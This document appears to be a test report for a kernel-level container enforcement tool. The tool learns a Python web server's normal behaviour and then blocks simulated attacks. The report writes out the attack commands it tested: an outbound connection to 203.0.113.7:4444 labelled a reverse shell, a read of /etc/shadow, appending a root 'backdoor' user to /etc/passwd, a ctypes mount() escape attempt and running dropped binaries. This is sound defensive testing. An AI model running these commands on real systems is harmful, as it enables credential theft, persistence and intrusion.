# Pahlevan on a live web application

A static file server ran for 50m0s under continuous traffic while Pahlevan
observed it. Enforcement was then switched on and the workload was attacked.
Nothing below is asserted: each line is what the kernel did.

| | |
|---|---|
| Started | 2026-08-15T21:06:56Z |
| Finished | 2026-08-15T21:57:17Z |
| Total run | 50m22s |
| Learning window | 50m0s |
| Cgroup | 76912 |
| Requests served | 1510 (0 failed) |
| Events observed | 233 (this cgroup only) |

## What it learned

This is the whole policy. Nobody wrote it, and it covers only the governed
cgroup - the data plane sees the whole node, but enforcement and this report
are scoped to the container.

**Binaries executed (1)**

- `/usr/bin/python3`

**Files touched (119)**

- `read /etc/gai.conf`
- `read /etc/host.conf`
- `read /etc/hosts`
- `read /etc/ld.so.cache`
- `read /etc/locale.alias`
- `read /etc/mime.types`
- `read /etc/nsswitch.conf`
- `read /etc/ssl/openssl.cnf`
- `read /home/pahlevan/pahlevan`
- `read /run/systemd/resolve/stub-resolv.conf`
- `read /tmp/pahlevan-webroot13110241/config.json`
- `read /tmp/pahlevan-webroot13110241/health`
- `read /tmp/pahlevan-webroot13110241/index.html`
- `read /tmp/pahlevan-webroot13110241/nonce`
- `read /usr/bin/python3.12`
- `read /usr/lib/locale/C.utf8/LC_CTYPE`
- `read /usr/lib/locale/locale-archive`
- `read /usr/lib/python3.12`
- `read /usr/lib/python3.12/__pycache__/_compression.cpython-312.pyc`
- `read /usr/lib/python3.12/__pycache__/_weakrefset.cpython-312.pyc`
- `read /usr/lib/python3.12/__pycache__/argparse.cpython-312.pyc`
- `read /usr/lib/python3.12/__pycache__/base64.cpython-312.pyc`
- `read /usr/lib/python3.12/__pycache__/bisect.cpython-312.pyc`
- `read /usr/lib/python3.12/__pycache__/bz2.cpython-312.pyc`
- `read /usr/lib/python3.12/__pycache__/calendar.cpython-312.pyc`
- `... and 94 more`

**Network destinations (6)**

- `0.0.0.0:0`
- `0.0.0.0:8080`
- `10.0.2.15:0`
- `10.42.0.0:0`
- `10.42.0.1:0`
- `127.0.0.53:53`

**Capabilities used (1)**

- `CAP_DAC_READ_SEARCH`

## What happened when it was attacked

| Scenario | Expected | Result |
|---|---|---|
| Legitimate traffic is still served | allowed | allowed (MATCH) |
| Reverse shell through the interpreter already in the image | denied | denied (MATCH) |
| Credential theft: read /etc/shadow | denied | denied (MATCH) |
| Persistence: append a user to /etc/passwd | denied | denied (MATCH) |
| Container escape: mount(2) from the interpreter | denied | denied (MATCH) |
| Webshell drops and runs a binary | denied | denied (MATCH) |
| Cryptominer under a plausible name | denied | denied (MATCH) |
| Shell spawned by the web server | denied | denied (MATCH) |
| The application itself is unaffected | allowed | allowed (MATCH) |

### Legitimate traffic is still served

The control, and the first thing to establish: enforcement that also breaks the workload is not a win. The request comes from outside the container, because that is where requests come from - Pahlevan governs what the workload does, not what is done to it.

```
$ GET /health from outside the cgroup
HTTP 200 from the application
```

### Reverse shell through the interpreter already in the image

The realistic post-exploitation move. python3 is present and learned - the application is written in it - so the exec succeeds. The connection is what fails: a static file server has never dialed anything, so every outbound destination is new.

```
$ python3 -c 'import socket;socket.create_connection(('\''203.0.113.7'\'',4444),2)'
exit status 1
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/lib/python3.12/socket.py", line 852, in create_connection
  File "/usr/lib/python3.12/socket.py", line 837, in create_connection
PermissionError: [Errno 1] Operation not permitted
[8 in-kernel denial(s) recorded]
```

### Credential theft: read /etc/shadow

Same permitted interpreter, a file the application never opened during the learning window.

```
$ python3 -c 'print(open('\''/etc/shadow'\'').read()[:40])'
exit status 1
Traceback (most recent call last):
  File "<string>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted: '/etc/shadow'
[4 in-kernel denial(s) recorded]
```

### Persistence: append a user to /etc/passwd

A shell redirect, so no new process is involved at all. The write path is what is refused: a workload that read /etc/passwd at startup does not thereby get to write it, because reads and writes are separate entries in the allow-set.

```
$ echo 'backdoor:x:0:0::/root:/bin/sh' >> /etc/passwd
exit status 2
/bin/sh: 1: cannot create /etc/passwd: Operation not permitted
[1 in-kernel denial(s) recorded]
```

### Container escape: mount(2) from the interpreter

Needs CAP_SYS_ADMIN. Going through python3 rather than /bin/mount means the exec is permitted and the capability hook is what refuses it.

```
$ python3 -c 'import ctypes;libc=ctypes.CDLL('\''libc.so.6'\'',use_errno=True);r=libc.mount(b'\''proc'\'',b'\''/mnt'\'',b'\''proc'\'',0,None);print('\''mount rc'\'',r,'\''errno'\'',ctypes.get_errno())'
exit status 1
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "<frozen importlib._bootstrap>", line 1360, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1331, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
  File "<fr...
[5 in-kernel denial(s) recorded]
```

### Webshell drops and runs a binary

The other half of the picture. Here the exec hook is the one that fires: the binary is real and executable, and has simply never been run by this workload.

```
$ /tmp/pahlevan-dropped -h
exit status 126
/bin/sh: 1: /tmp/pahlevan-dropped: Operation not permitted
[1 in-kernel denial(s) recorded]
```

### Cryptominer under a plausible name

Renaming it changes nothing. The allow-set keys on the resolved path, not on a signature or a name list, so there is no name that makes an unlearned binary permitted.

```
$ /tmp/xmrig
exit status 126
/bin/sh: 1: /tmp/xmrig: Operation not permitted
[1 in-kernel denial(s) recorded]
```

### Shell spawned by the web server

What a command-injection bug produces.

```
$ /bin/busybox sh -c id
exit status 126
/bin/sh: 1: /bin/busybox: Operation not permitted
[1 in-kernel denial(s) recorded]
```

### The application itself is unaffected

After every refusal above, the workload is asked to do the thing it was learned doing. If enforcement degraded the application, this is where it shows.

```
$ GET /health from outside the cgroup
HTTP 200 from the application
```

## Correcting the baseline

A baseline is a summary of one observation window, so it will sometimes be
wrong. Without a way to correct it the only options are a broken workload or
no enforcement, which is why this half of the model matters as much as the
learning does.

Everything below went through the real path: a PahlevanPolicySpec, through
internal/policy.Translate, applied by adaptive.ApplyOverrides - the same
function the controller calls before a container flips to enforcing.

| Step | Expected | Result |
|---|---|---|
| A legitimate path the learning window missed | denied | denied (MATCH) |
| The same read, after the exception is applied | allowed | allowed (MATCH) |
| A file the application really does serve | allowed | allowed (MATCH) |
| The same file, after deniedPaths revokes it | denied | denied (MATCH) |
| And restored, so the workload ends the run healthy | allowed | allowed (MATCH) |

### A legitimate path the learning window missed

Before any exception. The workload has a code path that reads the system trust store, and it did not run during the window - so the path is not in the baseline and the read is refused. This is the false denial every learned-baseline tool has to have an answer for.

```
$ python3 -c 'print(len(open('\''/etc/ssl/certs/ca-certificates.crt'\'').read()))'
exit status 1
Traceback (most recent call last):
  File "<string>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted: '/etc/ssl/certs/ca-certificates.crt'
[4 in-kernel denial(s) recorded]
```

### The same read, after the exception is applied

Nothing changed except the policy. The command is byte for byte the one refused above, the container was not restarted, and enforcement was never switched off - the entry was written into the same kernel allow-set the learning window populates, using the same key derivation, by the same function the controller calls.

```
$ python3 -c 'print(len(open('\''/etc/ssl/certs/ca-certificates.crt'\'').read()))'
182140
```

### A file the application really does serve

Requested hundreds of times during the learning window, so the read is unambiguously in the allow-set. The request comes from outside the container; the read it causes happens inside.

```
$ GET /config.json  (the app reads /tmp/pahlevan-webroot13110241/config.json)
HTTP 200  {"env":"demo"}
```

### The same file, after deniedPaths revokes it

The application can no longer read what it was serving a second ago, and the failure is visible in its response rather than in a log. This is the edge that matters when a learning window captured something it should not have: a deny list removes the entry even though the behavior was observed, so "we saw it happen" stops being the same thing as "it is permitted".

```
$ GET /config.json  (the app reads /tmp/pahlevan-webroot13110241/config.json)
the application could not serve the file: HTTP 404
HTTP 404
[1 in-kernel denial(s) recorded]
```

### And restored, so the workload ends the run healthy

The revocation is undone the same way it was applied. An operator who denies the wrong path is one exception away from undoing it.

```
$ GET /config.json  (the app reads /tmp/pahlevan-webroot13110241/config.json)
HTTP 200  {"env":"demo"}
```

## In-kernel denials recorded

- connect 203.0.113.7:4444 by python3
- file read /etc/default/apport by python3
- file read /usr/lib/python3.12/__pycache__/traceback.cpython-312.pyc by python3
- file read /usr/lib/python3.12/traceback.py by python3
- file read /usr/lib/python3.12/socket.py by python3
- file read /usr/lib/python3.12/socket.py by python3
- file read /usr/lib/python3.12/socket.py by python3
- file read /usr/lib/python3.12/socket.py by python3
- file read /etc/shadow by python3
- file read /etc/default/apport by python3
- file read /usr/lib/python3.12/__pycache__/traceback.cpython-312.pyc by python3
- file read /usr/lib/python3.12/traceback.py by python3
- file write /etc/passwd by sh
- file read /usr/lib/python3.12/ctypes/__pycache__/__init__.cpython-312.pyc by python3
- file read /usr/lib/python3.12/ctypes/__init__.py by python3
- file read /etc/default/apport by python3
- file read /usr/lib/python3.12/__pycache__/traceback.cpython-312.pyc by python3
- file read /usr/lib/python3.12/traceback.py by python3
- file read /tmp/pahlevan-dropped by sh
- file read /tmp/xmrig by sh
- file read /usr/bin/busybox by sh
- file read /etc/ssl/certs/ca-certificates.crt by python3
- file read /etc/default/apport by python3
- file read /usr/lib/python3.12/__pycache__/traceback.cpython-312.pyc by python3
- file read /usr/lib/python3.12/traceback.py by python3
- file read /tmp/pahlevan-webroot13110241/config.json by python3

